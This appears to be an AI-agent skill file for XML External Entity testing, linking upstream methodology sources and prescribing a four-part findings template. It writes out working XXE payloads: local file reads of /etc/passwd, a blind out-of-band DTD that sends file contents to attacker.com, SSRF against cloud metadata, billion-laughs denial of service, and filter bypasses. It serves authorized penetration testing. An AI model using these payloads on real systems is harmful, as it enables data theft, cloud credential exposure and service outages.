---
name: s-xxe
description: Unified XML External Entity Injection skill linking hack-skills methodology with AboutSecurity execution resources.
---

# Unified XML External Entity Injection

## When To Use

Use for XXE discovery: XML body injection, SVG/DOCX/XLSX file upload, blind XXE OOB, file read, SSRF escalation, DoS via billion laughs.

## Source Priority

| Task Type | Primary Source |
|---|---|
| Methodology | hack-skills |
| Execution | AboutSecurity |
| Ctf | AboutSecurity |
| Bug Bounty | hack-skills |
| Resources | AboutSecurity |

## Source Strategy

- Use hack-skills for methodology, scenario classification, domain coverage and deeper playbooks.
- Use AboutSecurity for execution constraints, mandatory rules, payload files, dictionaries, tool YAML configs, CTF and K8s fine-grained resources.
- Do not duplicate upstream content here. Load upstream files when needed.

## Recommended Loading Order

### High-Level Analysis

1. Read matched hack-skills files first unless Source Priority says otherwise.
2. Then read matched AboutSecurity files for constraints and execution details.

### Execution

1. Read matched AboutSecurity skill files first.
2. Check related Tools YAML.
3. Check related Payload/Dic/Doc files.
4. Fall back to hack-skills for scenario variants and methodology.

### Bug Bounty / Authorized Assessment

1. Prefer hack-skills methodology and scenario files.
2. Use AboutSecurity tools/resources for execution support.

## Matched hack-skills Skills

- `../../security-sources/hack-skills/skills/xxe-xml-external-entity/SKILL.md` — SKILL: XML External Entity Injection (XXE) — Expert Attack Playbook
- `../../security-sources/hack-skills/skills/upload-insecure-files/SKILL.md` — SKILL: Upload Insecure Files — Validation Bypass, Storage Abuse, and Processing Chains

## Matched AboutSecurity Skills

- `../../security-sources/AboutSecurity/skills/exploit/web-method/xxe-methodology/SKILL.md` — XXE 攻击方法论

## Related AboutSecurity Payloads

- `../../security-sources/AboutSecurity/Payload/xxe/_meta.yaml`
- `../../security-sources/AboutSecurity/Payload/xxe/payload.txt`

## Vulnerability Testing Output Template

When you discover a potential XXE vulnerability and begin active testing, ⛔ **MUST** structure findings using this fixed 4-module output template.

### Module 1: 测试思路 (Testing Approach)
- Describe injection context: XML SOAP/REST body, SVG image upload, DOCX/XLSX document parser, RSS/Atom feed consumer
- Classify XXE type: in-band (entity value in response), error-based (entity in error message), blind OOB (out-of-band DTD callback)
- State target: `/etc/passwd` (Linux), `c:/windows/win.ini` (Windows), cloud metadata, internal network file shares
- Document decision tree: XML accepted? → basic entity test → DTD allowed? → external entity test → parameter entity → OOB exfiltration
- Expected success indicator: file content in response, error message with file data, DNS/HTTP callback with exfiltrated content

### Module 2: 关键技巧 (Key Techniques)
- SVG upload XXE: many apps accept SVG as image but process XML — embed XXE in `<text>` element for visible file read
- DOCX/XLSX XXE: unzip → inject entity in `word/document.xml` → rezip → upload; parsers often resolve entities
- Error-based: use `<!ENTITY % file SYSTEM "file:///etc/passwd">` in external DTD → explode in attribute → error message leaks content
- Parameter entity chaining: external DTD defines `%file` → `%eval` → `%exfil` for blind OOB with full file content

### Module 3: Payload字典 (Payload Dictionary)
- ⛔ Provide minimum 3 payloads organized by target:
  1. **In-band file read**: `<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>` — content visible in response
  2. **Blind OOB with exfiltration**:
     ```xml
     <!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root/>
     ```
     evil.dtd: `<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?f=%file;'>">%eval;%exfil;`
  3. **SSRF via XXE**: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` — cloud metadata access
  4. **Billion laughs DoS**: `<!ENTITY a "loooooong_"><!ENTITY b "&a;&a;&a;&a;">...` — exponential entity expansion

### Module 4: 绕过方法 (Bypass Methods)
1. **DOCTYPE blacklist**: use UTF-16/UTF-8 BOM tricks, CDATA wrapping, external parameter entity to smuggle DOCTYPE
2. **ENTITY keyword filter**: use UTF-7 encoding, XML 1.1 features, XML Schema/DTD hybrid
3. **File protocol block**: use `php://filter/` → `php://filter/convert.base64-encode/resource=file:///etc/passwd`, `jar://`, `netdoc://` (Java)
4. **External connection block**: local DTD file listing attack — `<!ENTITY % dtd SYSTEM "file:///usr/share/xml/...">` → enumerate local DTDs → redefine parameter entities to leak data

## Important Agent Rules

- Do not treat this bridge file as the full knowledge source.
- Always load the matched upstream files needed for the task.
- Preserve and obey upstream mandatory execution rules.
- Avoid unnecessary brute force or destructive testing.
- Only operate in authorized environments.
